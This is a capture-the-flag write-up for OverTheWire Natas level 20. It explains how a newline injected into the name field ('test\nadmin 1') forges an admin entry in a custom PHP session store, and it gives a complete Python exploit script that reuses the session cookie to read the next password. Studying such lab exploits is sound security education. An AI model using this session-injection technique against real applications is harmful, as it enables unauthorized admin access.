# Natas Level 19 → 20

**Overview**

The goal of Natas Level 20 is to obtain the password for the next level.

For this level, the application uses a PHP session mechanism that parses session data based on newline-separated key value pairs. The vulnerability allows us to manipulate the session data by injecting an additional parameter into the value submitted through the name field.

- The important part of the exploit is understanding how the server processes the following input:

<test
admin 1>


- Instead of treating this as a single value, the server-side session parser can interpret it as two separate entries:

<name test
admin 1>

This allows us to create an admin session variable.


# Step 1: Understanding the Application

We start with the credentials obtained from the previous level:

Username: natas20
Password: <natas20_password>


The target URL is:

http://natas20.natas.labs.overthewire.org


The application stores session information using a custom format. The session data is separated using newline characters.

Because of this, injecting a newline (\n) into the name parameter can cause the application to interpret additional data as another session variable.

# Step 2: Creating the Payload

The payload used in the exploit is:

`payload = dict(name="test\nadmin 1")`


The important part is:

`\nadmin 1`


The newline separates the original value from the injected session variable.

Conceptually, the server can end up processing the data as:

<name test
admin 1>


The injected admin 1 entry causes the application to treat the current session as an administrator session.

# Step 3: Sending the Request

The first request is a POST request that submits the malicious name value.

```python
r = requests.post(
    url,
    auth=(username, password),
    data=payload
)
```

The server responds by setting a session cookie. We extract that cookie using:

`cookie = r.cookies.get_dict()`


This step is important because the session created by the first request needs to be reused in the next request.

# Step 4: Reusing the Session

We then send another request to the same endpoint while providing the session cookie:

```python
d = requests.get(
    url,
    auth=(username, password),
    cookies=cookie
)
```

The server now processes the manipulated session data and recognizes the admin value.

Finally, we print the response:

`print(d.content)`

*The response contains the password for the next Natas level.*


**Complete Exploit Script**

```python
import requests

username = "natas20"
password = "natas20_password"
url = "http://natas20.natas.labs.overthewire.org"

payload = dict(name="test\nadmin 1")

# Create a session containing the injected value
r = requests.post(
    url,
    auth=(username, password),
    data=payload
)

# Extract the session cookie
cookie = r.cookies.get_dict()

# Reuse the manipulated session
d = requests.get(
    url,
    auth=(username, password),
    cookies=cookie
)

print(d.content)
```

*Key Takeaways*

This level demonstrates several important web-security concepts:

- Session manipulation: User-controlled input can affect server-side session data.

- Newline injection: A newline character can sometimes be used to inject additional fields when an application uses line-based parsing.

- Session cookies: The session created by one request must be reused in subsequent requests.

- Input validation: Applications should not allow untrusted input to modify the structure of serialized session data.

- Custom serialization risks: Implementing a custom session format without safely encoding delimiters can lead to injection vulnerabilities.
